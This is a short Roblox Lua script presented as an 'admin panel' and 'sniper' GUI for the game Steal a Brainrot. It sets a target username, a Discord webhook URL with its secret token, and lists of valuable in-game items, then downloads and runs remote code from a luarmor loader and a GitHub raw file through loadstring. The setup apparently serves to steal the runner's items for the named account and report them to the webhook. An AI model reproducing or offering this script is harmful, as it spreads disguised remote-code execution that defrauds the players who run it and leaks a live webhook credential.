-- Mode: ADMINPANEL
getgenv().TARGET_USERNAME = "31agossssssssss"
getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1560739799814639657/r_jnwsCa7_6C8IWtNMcx54ak4SZtN2Qv5k8wJiE2dxZkhu0hIo4U5J0HD7c5JbGLKrWa"
getgenv().NORMAL_BRAINROTS = {
    ["Ketchuru and Musturu"] = true,
    ["Fragola La La La"] = true,
    ["Garama and Madundung"] = true,
    ["Fragrama and Chocrama"] = true,
    ["La Casa Boo"] = true,
    ["Signore Carapace"] = true,
    ["Grabatron"] = true,
    ["Polaroidini"] = true,
    ["Oni Oni Panda"] = true,
    ["Sammyni Spookyni"] = true,
    ["Phoenix"] = true,
    ["Flying Dutchman"] = true,
    ["Dragon Skeletonini"] = true,
    ["Headless Horseman"] = true,
    ["Skibidi Toilet"] = true,
    ["John Pork"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true
}
getgenv().NORMAL_BASE_SKINS = {
    ["Tralalero"] = true,
    ["Rose"] = true,
    ["Gingerbread"] = true,
    ["Halloween"] = true,
    ["Christmas"] = true,
    ["Bunny Basket"] = true,
    ["Summer"] = true,
    ["Pot of Gold"] = true,
    ["Taco"] = true,
    ["Octo"] = true,
    ["Valentines"] = true,
    ["Easter"] = true,
    ["Lucky"] = true,
    ["Aquatic"] = true,
    ["Bee Emperor"] = true,
    ["Honey Bee"] = true
}
getgenv().NORMAL_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Yin Yang Slap"] = true,
    ["Cursed Slap"] = true,
    ["Cyber Slap"] = true,
    ["Divine Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Radioactive Slap"] = true,
    ["Rainbow Slap"] = true,
    ["Rainbow Hammer"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Radioactive Airstrike"] = true,
    ["Yin Yang Lamp"] = true,
    ["Demon's Head"] = true,
    ["Lava Slap"] = true,
    ["Lava Blaster"] = true,
    ["Alien Slap"] = true,
    ["Blackhole Bomb"] = true,
    ["Candy Sentry"] = true,
    ["Phantom Slap"] = true,
    ["Flying Bee"] = true,
    ["Crystal Slap"] = true,
    ["Candy Slap"] = true,
    ["Crystal Hammer"] = true
}

-- Cargando GUI SNIPER
task.spawn(function()
   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)

-- Cargando Sniper.lua desde GitHub
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sab-api/GUIAP/refs/heads/main/GUIAP.lua"))()
end)